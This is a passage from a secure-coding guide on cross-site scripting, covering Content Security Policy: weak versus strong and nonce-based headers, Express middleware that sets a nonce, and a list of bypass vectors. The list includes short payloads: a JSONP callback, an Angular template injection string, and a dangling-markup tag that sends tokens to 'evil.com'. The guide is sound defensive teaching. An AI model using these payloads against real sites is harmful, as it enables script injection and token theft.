---
source: "common/xss.md"
title: "Cross-Site Scripting (XSS) — Reflected, Stored, DOM-based, CSP Bypass"
heading: "Content Security Policy (CSP)"
category: "common-vuln"
language: "common"
severity: "critical"
tags: [common-vuln, content, contexts, security, types, vibe, what]
chunk: 5/10
---

## Content Security Policy (CSP)

**CSP is your second line of defense** — it limits what scripts can execute even if an XSS payload is injected.

### Weak CSP (Easily Bypassed)
```http
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com
```
This is practically useless — `'unsafe-inline'` allows inline scripts, `'unsafe-eval'` allows `eval()`.

### Strong CSP
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none';
```

### Nonce-Based CSP (Recommended)
```http
Content-Security-Policy: script-src 'self' 'nonce-{random}' 'strict-dynamic'
```
```javascript
// Server generates a unique nonce per request
app.use((req, res, next) => {
    res.locals.nonce = crypto.randomBytes(16).toString('hex');
    res.setHeader('Content-Security-Policy',
        `script-src 'nonce-${res.locals.nonce}'`);
    next();
});
```

### CSP Bypass Vectors Watch Out For

- **JSONP endpoints:** `?callback=alert(1)` on trusted CDNs
- **File upload:** Uploading `.js` files to `self`-allowed origins
- **Angular/React clone nodes:** `{{constructor.constructor('alert(1)')()}}`
- **Dangling markup injection:** Stealing tokens via `<img src="https://evil.com/steal?`

---